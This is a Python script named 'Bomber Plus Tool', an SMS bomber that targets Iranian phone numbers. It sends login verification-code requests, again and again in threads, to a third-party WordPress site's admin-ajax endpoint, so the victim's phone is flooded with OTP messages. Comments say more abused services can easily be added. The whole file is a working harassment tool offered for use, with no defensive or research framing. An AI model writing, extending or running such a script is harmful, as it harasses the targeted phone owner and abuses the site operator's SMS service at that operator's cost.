from threading import Thread
from time import sleep
import socket
import sys
import re

try:
    import requests
except ImportError:
    import os
    os.system("python3 -m pip install requests")
    import requests

# ------------------------------
# Colors
# ------------------------------
r = '\033[31;1m'
g = '\033[32;1m'
y = '\033[33;1m'
p = '\033[35;1m'
a = '\033[0m'

# ------------------------------
# Slow print
# ------------------------------
def print_slow(text, delay=0.009):
    for char in text:
        print(char, end='', flush=True)
        sleep(delay)
    print()

# ------------------------------
# Check internet
# ------------------------------
def check_internet():
    try:
        socket.gethostbyname("google.com")
        return True
    except socket.gaierror:
        return False

# ------------------------------
# Phone validation
# ------------------------------
def is_phone(phone: str):
    m = re.match(r"^(?:\+989|989|09|9)\d{9}$", phone)
    if m:
        return re.sub(r"^(?:\+989|989|09|9)", "+98", phone)
    return False

# ------------------------------
# SMS Services
# ------------------------------
def ilozi(phone):
    url = "https://ilozi.com/wp-admin/admin-ajax.php"
    
    payload = {
        "action": "digits_forms_ajax",
        "type": "login",
        "digits": "1",
        "instance_id": "a15a96e438ca5771bfd748a1fdf98103",
        "action_type": "phone",
        "digits_phone": phone.replace("+98", ""),  # شماره بدون کد کشور
        "login_digt_countrycode": "+98",
    }
    
    try:
        response = requests.post(url, data=payload, timeout=5)
        if response.status_code == 200:
            print(f"{g}(Ilozi) Code Sent to {phone}{a}")
            return True
        else:
            print(f"{r}[-] (Ilozi) Failed or No Response, Status: {response.status_code}{a}")
            return False
    except Exception as e:
        print(f"{r}[!] Ilozi Exception: {e}{a}")
        return False

def run_service(service, phone):
    """Wrapper for service to handle exceptions safely"""
    try:
        service(phone)
    except Exception as e:
        print(f"{r}[!] {service.__name__} Exception: {e}{a}")

# ------------------------------
# SMS Bomber Logic
# ------------------------------
def Vip(phone, delay_time):
    services = [ilozi]  # اضافه کردن سرویس‌های دیگر به راحتی
    print_slow(f"{p}╔═════[ SMS Bombing Initiated ]═════╗")
    print_slow(f"{g}Target: {y}{phone}")
    print_slow(f"{g}Services: {y}{len(services)}")
    print_slow(f"{g}Delay: {y}{delay_time}s")
    print_slow(f"{p}╚═══════════════════════════════════╝")
    sleep(1)

    try:
        while True:
            for service in services:
                Thread(target=run_service, args=(service, phone)).start()
                sleep(delay_time)
    except KeyboardInterrupt:
        print_slow(f"{g}[+] Mission Completed!{a}")

# ------------------------------
# Menu
# ------------------------------
def main_menu():
    print_slow("""
╔════════════════════════════════════════════════════╗
║             ⟬ Bomber Plus Tool ⟭                 ║
╚════════════════════════════════════════════════════╝
Choose an Option:
    [1] SMS Bomber
    [0] Exit
""")
    return input("Enter Choice: ")

def main():
    if not check_internet():
        print(f"{r}No Internet Connection!{a}")
        return

    while True:
        choice = main_menu()
        if choice == "1":
            phone = input("Enter Phone (+98): ")
            phone = is_phone(phone)
            if not phone:
                print(f"{r}Invalid Phone!{a}")
                continue
            try:
                delay_time = float(input("Delay (seconds, default 0.1): ") or 0.1)
            except ValueError:
                delay_time = 0.1
            Vip(phone, delay_time)
        elif choice == "0":
            print("Exiting...")
            break
        else:
            print("Invalid Choice!")

if __name__ == "__main__":
    main()
